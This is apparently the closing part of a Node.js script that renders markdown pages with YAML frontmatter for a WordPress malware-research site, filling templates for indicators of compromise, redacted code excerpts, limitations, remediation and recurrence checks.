      "Monitor plugin creation and user-role changes.",
    ],
    related: [
      "functions-php-hidden-admin-query-backdoor",
      "wp-user-query-hidden-admin-filter",
      "system-control-hidden-backup-restoration",
    ],
    guides: [
      guide(
        "WP compatibility backdoor guide",
        "/blog/wp-compat-plugin-the-hidden-backdoor-in-your-wordpress-site/",
      ),
      hiddenAdminGuide,
    ],
    cases: [],
  },
];

const yamlQuote = (value) => JSON.stringify(value);
const list = (values, indent = 0) =>
  values
    .map((value) => `${" ".repeat(indent)}- ${yamlQuote(value)}`)
    .join("\n");
const internalLinks = (values) =>
  values.length
    ? values
        .map(
          ({ title, href }) =>
            `  - title: ${yamlQuote(title)}\n    href: ${yamlQuote(href)}`,
        )
        .join("\n")
    : "[]";

const imageMetadata = new Map();
async function screenshotData(image) {
  const imagePath = path.join(imageDir, image.file);
  if (!imageMetadata.has(image.file)) {
    imageMetadata.set(image.file, await sharp(imagePath).metadata());
  }
  const metadata = imageMetadata.get(image.file);
  return { ...image, width: metadata.width, height: metadata.height };
}

function screenshotFrontmatter(images) {
  if (!images.length) return "[]";
  return images
    .map(
      (image) =>
        `  - src: ${yamlQuote(`/wordpress-researches/${image.file}`)}\n` +
        `    alt: ${yamlQuote(image.alt)}\n` +
        `    caption: ${yamlQuote(image.caption)}\n` +
        `    supports: ${yamlQuote(image.supports)}\n` +
        `    width: ${image.width}\n` +
        `    height: ${image.height}\n` +
        `    privacyReviewed: true`,
    )
    .join("\n");
}

function indicatorFrontmatter(entry) {
  const indicators = [
    ...entry.high.map((value) => ({
      value,
      type: "distinctive artifact",
      confidence: "higher",
    })),
    ...entry.contextual.map((value) => ({
      value,
      type: "contextual indicator",
      confidence: "contextual",
    })),
  ];
  return indicators
    .map(
      (indicator) =>
        `  - value: ${yamlQuote(indicator.value)}\n` +
        `    type: ${yamlQuote(indicator.type)}\n` +
        `    confidence: ${yamlQuote(indicator.confidence)}`,
    )
    .join("\n");
}

function bodyImages(images) {
  if (!images.length)
    return "The public entry does not use a screenshot because the retained images either exposed sensitive values, showed a complete encoded payload, or did not add reliable evidence beyond the supplied code.";
  return images
    .map(
      (image) =>
        `${image.supports}.\n\n![${image.alt}](/wordpress-researches/${image.file} ${yamlQuote(image.caption)})`,
    )
    .join("\n\n");
}

function bullets(values) {
  return values.map((value) => `- ${value}`).join("\n");
}

function relatedResearch(entry, bySlug) {
  return entry.related
    .map((slug) => {
      const target = bySlug.get(slug);
      const label = target?.h1 || slug.replaceAll("-", " ");
      return `- [${label}](/malware-research/${slug}/)`;
    })
    .join("\n");
}

function relatedGuides(entry) {
  return [...entry.guides, ...entry.cases]
    .map(({ title, href }) => `- [${title}](${href})`)
    .join("\n");
}

function render(entry, bySlug) {
  const canonical = `https://www.mdpabel.com/malware-research/${entry.slug}/`;
  return `---
title: ${yamlQuote(entry.title)}
h1: ${yamlQuote(entry.h1)}
slug: ${yamlQuote(entry.slug)}
description: ${yamlQuote(entry.description)}
status: "published"
reportDate: ${yamlQuote(entry.reportDate)}
lastReviewed: "2026-07-22"
threatCategory: ${yamlQuote(entry.category)}
affectedComponents:
${list(entry.components, 2)}
observedLocations:
${list(entry.locations, 2)}
confirmedBehaviors:
${list(entry.behaviors, 2)}
confidence: ${yamlQuote(entry.confidence)}
severity: ${yamlQuote(entry.severity)}
severityRationale: ${yamlQuote(entry.rationale)}
evidenceSource: ${yamlQuote(entry.evidence)}
schemaType: "TechArticle"
screenshots:${entry.images.length ? `\n${screenshotFrontmatter(entry.images)}` : " []"}
indicators:
${indicatorFrontmatter(entry)}
limitations:
${list(entry.unknown, 2)}
relatedResearch:
${list(entry.related, 2)}
relatedGuides:${entry.guides.length ? `\n${internalLinks(entry.guides)}` : " []"}
relatedCaseStudies:${entry.cases.length ? `\n${internalLinks(entry.cases)}` : " []"}
relatedService:
  title: ${yamlQuote(service.title)}
  href: ${yamlQuote(service.href)}
canonical: ${yamlQuote(canonical)}
index: true
---

## Summary

This WordPress malware research entry documents ${entry.category.toLowerCase()} evidence observed during one anonymized client investigation. The narrow topic is **${entry.h1}**: the page records the exact artifact, identifiers, and visible control flow instead of repeating a general malware-removal article.

${entry.assessment}

## Investigation context

${entry.evidence}. The report date is retained from the original investigation notes. Broader cleanup guidance remains in [the WordPress malware removal guide](${malwareGuide.href}); this entry is limited to what the supplied code and screenshots support.

## Observed artifact

${bodyImages(entry.images)}

## Confirmed findings

${bullets(entry.confirmed)}

## Technical analysis

### ${entry.heading}

The following code keeps the identifiers and control flow needed for defensive verification while removing secrets, complete payloads, and operational request instructions.

**Redacted defensive excerpt**

\`\`\`${entry.excerptLang}
${entry.excerpt}
\`\`\`

This excerpt is intentionally incomplete. It should be used for code search, baseline comparison, and incident review—not copied into a live site.

## Analyst assessment

${entry.assessment}

The severity reflects the capability visible in this artifact and its position in the investigated WordPress environment. It is not a claim about campaign prevalence, a particular vulnerability, or an outcome that the retained evidence does not show.

## Indicators of compromise

### Higher-confidence indicators

${bullets(entry.high.map((value) => `\`${value}\``))}

### Contextual indicators

${bullets(entry.contextual.map((value) => `\`${value}\``))}

Contextual indicators are not proof of infection by themselves. Confirm them through trusted-file comparison, neighboring code, database provenance, request logs, or the distinctive combinations listed above.

## What this evidence does not establish

${bullets(entry.unknown)}

## Artifact-specific remediation

${bullets(entry.remediation)}

For a complete response sequence, use the [broader malware-removal guide](${malwareGuide.href}) or the [WordPress malware-removal service](${service.href}) when hands-on incident response is appropriate.

## Recurrence verification

${bullets(entry.recurrence)}

## Related malware research

[Browse the WordPress malware research hub](/malware-research/).

${relatedResearch(entry, bySlug)}

## Related guides and case studies

${relatedGuides(entry)}

## Methodology and privacy note

This analysis is based on retained code, screenshots, paths, and notes from an anonymized WordPress client investigation. Confirmed findings are limited to visible or supplied evidence; professional interpretation is labeled as analyst assessment. Screenshots were reviewed for client identifiers, account paths, usernames, email addresses, credentials, tokens, database details, and unrelated records. Sensitive or operational material remains outside the public page, and every public code block is a redacted defensive excerpt.
`;
}

const duplicateFiles = entries.filter(
  (entry, index) =>
    entries.findIndex((candidate) => candidate.file === entry.file) !== index,
);
if (duplicateFiles.length) {
  throw new Error(
    `Duplicate entry definitions: ${duplicateFiles.map((entry) => entry.file).join(", ")}`,
  );
}
if (entries.length !== 29) {
  throw new Error(`Expected 29 entries, found ${entries.length}`);
}

for (const entry of entries) {
  entry.images = await Promise.all(entry.images.map(screenshotData));
}
const bySlug = new Map(entries.map((entry) => [entry.slug, entry]));

for (const entry of entries) {
  const destination = path.join(contentDir, entry.file);
  fs.writeFileSync(destination, render(entry, bySlug), "utf8");
}

console.log(
  `Generated ${entries.length} optimized WordPress malware research entries.`,
);
